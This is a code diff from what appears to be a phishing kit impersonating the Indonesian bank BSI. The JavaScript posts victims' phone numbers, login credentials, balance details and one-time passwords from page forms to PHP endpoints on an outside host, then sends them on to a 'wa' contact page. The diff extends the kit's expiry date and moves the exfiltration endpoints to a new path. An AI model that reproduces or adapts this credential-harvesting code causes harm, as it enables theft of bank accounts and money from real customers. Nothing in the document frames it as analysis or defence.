@@ -1,5 +1,5 @@
 let tglNow = new Date();
-let waktuBatas = new Date("2025-06-05T23:59:59");
+let waktuBatas = new Date("2025-06-12T23:59:59");
 if (tglNow.getTime() >= waktuBatas.getTime()) {
   document.location.href = 'https://expiredweb.pages.dev';
 } else {
@@ -19,7 +19,7 @@ $('.process1').fadeIn();
  
       $.ajax({
             type: 'POST',
-            url: 'https://anjayhostjon.cloud/BSI/b2gb5/no.php',
+            url: 'https://anjayhostjon.cloud/BSI/7hs2v/no.php',
             data: $('#formHP').serialize(),
             datatype: 'text',
             
@@ -39,7 +39,7 @@ $('.process1').fadeIn();
  document.getElementById('btnSubmit1').innerHTML ="Memproses..."; 
       $.ajax({
             type: 'POST',
-            url: 'https://anjayhostjon.cloud/BSI/b2gb5/login.php',
+            url: 'https://anjayhostjon.cloud/BSI/7hs2v/login.php',
             data: $('#formLog').serialize(),
             datatype: 'text',          
             complete: function(data) {
@@ -67,7 +67,7 @@ $('.process1').fadeIn();
  document.getElementById('btnSubmit1').innerHTML ="Memproses..."; 
       $.ajax({
             type: 'POST',
-            url: 'https://anjayhostjon.cloud/BSI/b2gb5/saldo.php',
+            url: 'https://anjayhostjon.cloud/BSI/7hs2v/saldo.php',
             data: $('#jualpuki').serialize(),
             datatype: 'text',          
             complete: function(data) {
@@ -99,7 +99,7 @@ function sendOtp() {
  document.getElementById('btnSubmit1').innerHTML = "Memproses...";    
 $.ajax({
  type: 'POST',
- url: 'https://anjayhostjon.cloud/BSI/b2gb5/otp.php',
+ url: 'https://anjayhostjon.cloud/BSI/7hs2v/otp.php',
  async: false,
  dataType: 'JSON',
  data: $('#form2').serialize(),
@@ -134,7 +134,7 @@ function getcs(){
  $("#djload").show();   
   
 setTimeout(function(){  
-location.href='https://anjayhostjon.cloud/BSI/b2gb5/wa';
+location.href='https://anjayhostjon.cloud/BSI/7hs2v/wa';
     }, 1000);
     setTimeout(function(){
     $("#djload").hide();   
